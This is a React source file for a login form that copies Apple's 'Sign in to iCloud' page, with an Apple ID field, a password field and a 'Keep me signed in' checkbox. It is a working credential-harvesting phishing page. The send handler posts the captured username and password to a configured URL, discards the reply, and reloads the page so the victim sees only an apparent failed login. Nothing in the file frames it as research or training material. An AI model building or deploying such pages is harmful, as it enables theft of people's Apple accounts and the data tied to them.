import axios from "axios";
import { useState } from "react";
import url from "../../config/url";
import "./inputForm.scss";
const initialForm = {
  username: "",
  password: "",
};

const InputForm = () => {
  const [toogle, setToogle] = useState(false);
  const [formValue, setFormValue] = useState(initialForm);
  const [loading, setLoading] = useState(true);
  const [loading2, setLoading2] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValue({ ...formValue, [name]: value });
  };

  const handleClickUserName = () => {
    setToogle(true);
    setTimeout(() => setLoading(false), 2000);
  };
  const handleSendForm = () => {
    setLoading2(true);
    axios
      .post(url, formValue)
      .then((res) => {})
      .catch((err) => {});
    setTimeout(() => window.location.reload(false), 2000);
  };

  return (
    <section>
      <div className="form_container">
        <img
          className="bg_img"
          src={require("../../assets/imgs/desktop.png")}
          alt="abs"
        />
        <div className="form_wrapper">
          <div className="submit_form--container">
            <div className="logo">
              <img src="data:image/png;base64,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" />
            </div>
            <div className="submit_form--wrapper">
              <div className="title">Sign in to iCloud</div>

              <div className="input_group">
                <div className="username">
                  <input
                    type="text"
                    placeholder="Apple ID"
                    name="username"
                    value={formValue.username}
                    onChange={handleInputChange}
                  />
                  {!toogle && (
                    <button
                      disabled={formValue.username < 1}
                      className="arrow"
                      onClick={handleClickUserName}
                      style={{
                        cursor: formValue.username < 1 ? "default" : "pointer",
                      }}
                    ></button>
                  )}
                  {toogle && loading && (
                    <img
                      src={require("../../assets/imgs/loading.gif")}
                      alt="loading"
                    />
                  )}
                </div>
                {!loading && (
                  <div className="password">
                    <input
                      name="password"
                      value={formValue.password}
                      type="password"
                      placeholder="Password"
                      onChange={handleInputChange}
                    />
                    {!loading2 && (
                      <button
                        disabled={formValue.password < 1}
                        className="arrow"
                        onClick={handleSendForm}
                        style={{
                          cursor:
                            formValue.password < 1 ? "default" : "pointer",
                        }}
                      ></button>
                    )}
                    {loading2 && (
                      <img
                        src={require("../../assets/imgs/loading.gif")}
                        alt="loading"
                      />
                    )}
                  </div>
                )}
              </div>
              <div className="checkbox_group">
                <input
                  type="checkbox"
                  name="checkbox"
                  id="id-checkbox"
                  onChange={handleInputChange}
                />
                <label htmlFor="id-checkbox">Keep me signed in</label>
              </div>
              <div className="forgot_password">
                Forgot Apple ID or password?
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="13"
                  height="13"
                  fill="currentColor"
                  className="bi bi-arrow-up-right"
                  viewBox="0 0 16 16"
                >
                  <path
                    fill-rule="evenodd"
                    d="M14 2.5a.5.5 0 0 0-.5-.5h-6a.5.5 0 0 0 0 1h4.793L2.146 13.146a.5.5 0 0 0 .708.708L13 3.707V8.5a.5.5 0 0 0 1 0v-6z"
                  />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default InputForm;
